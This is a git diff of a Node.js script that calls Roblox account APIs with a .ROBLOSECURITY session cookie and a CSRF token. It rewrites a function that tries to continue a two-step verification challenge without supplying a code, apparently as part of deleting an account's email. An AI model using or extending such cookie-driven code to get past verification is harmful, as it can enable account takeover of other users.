@@ -260,7 +260,84 @@ function deleteEmail(cookie, csrfToken, emailAddress, challengeId = null) {
   });
 }
 
-async function getChallengeMetadata(cookie, challengeId) {
+
+
+function continueChallenge(cookie, csrfToken, challengeId) {
+  return new Promise((resolve, reject) => {
+    // First, try to get challenge metadata to understand the challenge better
+    getChallengeInfo(cookie, challengeId)
+      .then(challengeInfo => {
+        console.log("Challenge info:", challengeInfo);
+        
+        // For two-step verification challenges, we need to send a continue request
+        const payload = JSON.stringify({
+          challengeId: challengeId,
+          challengeType: "twostepverification", 
+          challengeMetadata: "{\"actionType\":\"Generic\"}"
+        });
+
+        const req = https.request(
+          {
+            method: "POST",
+            hostname: "apis.roblox.com",
+            path: "/challenge/v1/continue",
+            headers: {
+              Cookie: `.ROBLOSECURITY=${cookie}`,
+              "X-CSRF-TOKEN": csrfToken,
+              "Content-Type": "application/json",
+              Accept: "application/json",
+              "Content-Length": Buffer.byteLength(payload),
+              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            },
+          },
+          (res) => {
+            let data = "";
+            res.on("data", (chunk) => (data += chunk));
+            res.on("end", () => {
+              console.log("Challenge continue response status:", res.statusCode);
+              console.log("Challenge continue response data:", data);
+              console.log("Challenge continue response headers:", res.headers);
+
+              try {
+                const parsed = data ? JSON.parse(data) : {};
+                
+                if (res.statusCode === 200) {
+                  resolve({ success: true, data: parsed });
+                } else {
+                  resolve({ 
+                    success: false, 
+                    status: res.statusCode, 
+                    data: parsed,
+                    error: `HTTP ${res.statusCode} Data: ${data}`
+                  });
+                }
+              } catch (e) {
+                resolve({
+                  success: false,
+                  error: `Invalid JSON response: ${data}`,
+                  status: res.statusCode
+                });
+              }
+            });
+          },
+        );
+
+        req.on("error", reject);
+        req.write(payload);
+        req.end();
+      })
+      .catch(error => {
+        console.log("Could not get challenge info, trying direct continue...");
+        // If we can't get challenge info, just resolve as failed
+        resolve({
+          success: false,
+          error: "Challenge info retrieval failed: " + error.message
+        });
+      });
+  });
+}
+
+function getChallengeInfo(cookie, challengeId) {
   return new Promise((resolve, reject) => {
     const req = https.request(
       {
@@ -277,77 +354,24 @@ async function getChallengeMetadata(cookie, challengeId) {
         let data = "";
         res.on("data", (chunk) => (data += chunk));
         res.on("end", () => {
+          console.log("Challenge info response status:", res.statusCode);
+          console.log("Challenge info response data:", data);
+          
           try {
             const parsed = JSON.parse(data);
-            resolve(parsed);
-          } catch (e) {
-            reject(new Error(`Invalid JSON from challenge metadata: ${data}`));
-          }
-        });
-      },
-    );
-
-    req.on("error", reject);
-    req.end();
-  });
-}
-
-function continueChallenge(cookie, csrfToken, challengeId) {
-  return new Promise((resolve, reject) => {
-    const payload = JSON.stringify({
-      challengeId: challengeId,
-      challengeType: "twostepverification",
-      challengeMetadata: "{}"
-    });
-
-    const req = https.request(
-      {
-        method: "POST",
-        hostname: "auth.roblox.com",
-        path: "/v2/challenges/continue",
-        headers: {
-          Cookie: `.ROBLOSECURITY=${cookie}`,
-          "X-CSRF-TOKEN": csrfToken,
-          "Content-Type": "application/json",
-          Accept: "application/json",
-          "Content-Length": Buffer.byteLength(payload),
-          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        },
-      },
-      (res) => {
-        let data = "";
-        res.on("data", (chunk) => (data += chunk));
-        res.on("end", () => {
-          console.log("Challenge continue response status:", res.statusCode);
-          console.log("Challenge continue response data:", data);
-          console.log("Challenge continue response headers:", res.headers);
-
-          try {
-            const parsed = data ? JSON.parse(data) : {};
-            
             if (res.statusCode === 200) {
-              resolve({ success: true, data: parsed });
+              resolve(parsed);
             } else {
-              resolve({ 
-                success: false, 
-                status: res.statusCode, 
-                data: parsed,
-                error: `HTTP ${res.statusCode} Data: ${data}`
-              });
+              reject(new Error(`HTTP ${res.statusCode}: ${data}`));
             }
           } catch (e) {
-            resolve({
-              success: false,
-              error: `Invalid JSON response: ${data}`,
-              status: res.statusCode
-            });
+            reject(new Error(`Invalid JSON from challenge info: ${data}`));
           }
         });
       },
     );
 
     req.on("error", reject);
-    req.write(payload);
     req.end();
   });
 }
